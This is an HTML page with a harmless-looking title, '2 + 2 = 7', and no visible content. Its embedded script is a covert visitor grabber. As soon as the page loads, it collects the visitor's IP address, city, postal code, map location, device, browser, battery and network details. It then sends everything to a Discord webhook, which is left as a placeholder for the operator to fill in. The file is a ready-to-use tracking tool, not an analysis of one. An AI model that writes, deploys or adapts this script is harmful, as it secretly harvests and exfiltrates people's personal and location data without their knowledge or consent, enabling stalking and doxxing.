<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>2 + 2 = 7</title>
</head>
<body>

<script>
  async function sendWebhook(data) {
    const webhookURL = 'YOUR DISCORD WEBHOOK HERE';
    const payload = {
      embeds: [
        {
          title: 'Someone visited the website ! :information_source:',
          color: 0x000000, // Black color
          fields: data,
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        console.error('error sending message :', response.statusText);
      }
    } catch (error) {
      console.error('error sending message :', error);
    }
  }

  async function collectInformation() {
    const collectedData = [];

    const userAgent = navigator.userAgent;
    collectedData.push({ name: '» User Agent', value: userAgent });

    const language = navigator.language;
    collectedData.push({ name: '» Browser language', value: language });

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    collectedData.push({ name: '» Screen resolution', value: screenResolution });

    const deviceInfo = getDeviceInfo();
    collectedData.push({ name: '» Device Info', value: deviceInfo });

    const browser = getBrowserInfo();
    collectedData.push({ name: '» Browser', value: browser });

    const operatingSystem = getOperatingSystem();
    collectedData.push({ name: '» Operating system', value: operatingSystem });

    const referrer = document.referrer || 'no referent';
    collectedData.push({ name: '» Referent', value: referrer });

    try {
      const geoLocationAPI = 'https://ipapi.co/json';
      const ipInfoResponse = await fetch(geoLocationAPI);
      const ipInfoData = await ipInfoResponse.json();
      if (ipInfoResponse.ok) {
        collectedData.push({ name: '» IP address', value: ipInfoData.ip });
        collectedData.push({ name: '» Country', value: ipInfoData.country_name });
        collectedData.push({ name: '» Area', value: ipInfoData.region });
        collectedData.push({ name: '» City', value: ipInfoData.city });
        collectedData.push({ name: '» Zip code', value: ipInfoData.postal });
        const googleMapsLink = `[View on Google Maps](${getGoogleMapsLink(ipInfoData.latitude, ipInfoData.longitude)})`;
        collectedData.push({ name: '» Google Maps location', value: googleMapsLink });
      }
    } catch (error) {
      console.error('error 2 :', error);
    }

    collectedData.push({ name: '» Network connection type', value: getNetworkConnectionType() });
    collectedData.push({ name: '» Device language', value: getDeviceLanguage() });
    collectedData.push({ name: '» Browser features', value: getBrowserCapabilities() });
    collectedData.push({ name: '» Bandwidth estimation', value: await getEstimatedBandwidth() });
    collectedData.push({ name: '» Device platform', value: getDevicePlatform() });
    collectedData.push({ name: '» Browser memory', value: getBrowserMemory() });

    // Battery information
    try {
      const batteryInfo = await getBatteryInfo();
      collectedData.push({ name: '» Battery Level', value: `${batteryInfo.level * 100}%` });
      collectedData.push({ name: '» Battery Charging', value: batteryInfo.charging ? 'Yes' : 'No' });
      collectedData.push({ name: '» Battery Charging Time', value: `${batteryInfo.chargingTime.toFixed(2)} seconds` });
      collectedData.push({ name: '» Battery Discharging Time', value: `${batteryInfo.dischargingTime.toFixed(2)} seconds` });
      collectedData.push({ name: '» Battery Charge Type', value: batteryInfo.chargeType });
    } catch (error) {
      console.error('error getting battery information:', error);
    }

    sendWebhook(collectedData);
  }

  function getDeviceInfo() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(navigator.userAgent);
    const isDesktop = !isMobile && !isTablet;

    if (isDesktop) {
      return 'Desktop';
    } else if (isTablet) {
      return 'Tablet';
    } else {
      // Get more detailed device information for mobile
      const mobileDevice = getMobileDevice();
      return `Mobile (${mobileDevice})`;
    }
  }

  function getMobileDevice() {
    const ua = navigator.userAgent;
    const mobileDevice = ua.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/);
    return mobileDevice ? mobileDevice[0] : 'Unknown Mobile Device';
  }

  function getBatteryInfo() {
    return new Promise(async (resolve, reject) => {
      try {
        const battery = await navigator.getBattery();
        resolve({
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          chargeType: getBatteryChargeType(battery.charging)
        });
      } catch (error) {
        reject(error);
      }
    });
  }

  function getBatteryChargeType(isCharging) {
    if (!isCharging) {
      return 'Not Applicable';
    }

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type) {
      return connection.type;
    } else {
      return 'Unknown';
    }
  }

  function getBrowserInfo() {
    const ua = navigator.userAgent;
    const browser = ua.match(/(Chrome|Safari|Firefox|Edge|IE|Opera)\/?\s*(\.?\d+(\.\d+)*)/);
    return browser ? `${browser[1]} ${browser[2]}` : 'Unknown';
  }

  function getOperatingSystem() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Win') !== -1) os = 'Windows';
    else if (ua.indexOf('Mac') !== -1) os = 'MacOS';
    else if (ua.indexOf('Linux') !== -1) os = 'Linux';
    else if (ua.indexOf('Android') !== -1) os = 'Android';
    else if (ua.indexOf('iOS') !== -1) os = 'iOS';
    return os;
  }

  function getNetworkConnectionType() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return connection ? connection.effectiveType : 'Not available';
  }

  function getDeviceLanguage() {
    return navigator.language || 'Not available';
  }

  function getBrowserCapabilities() {
    const capabilities = [];
    capabilities.push(`» Cookies: ${navigator.cookieEnabled}`);
    capabilities.push(`» JavaScript: ${navigator.javaEnabled()}`);
    return capabilities.join('\n');
  }

  async function getEstimatedBandwidth() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return connection ? `${(connection.downlink * 1024).toFixed(2)} KB/s` : 'Not available';
  }

  function getDevicePlatform() {
    return navigator.platform || 'Not available';
  }

  function getBrowserMemory() {
    return `${(performance.memory.totalJSHeapSize / 1048576).toFixed(2)} Mo`;
  }

  function getGoogleMapsLink(latitude, longitude) {
    return `https://www.google.com/maps/place/${latitude},${longitude}`;
  }

  collectInformation();
</script>

</body>
</html>
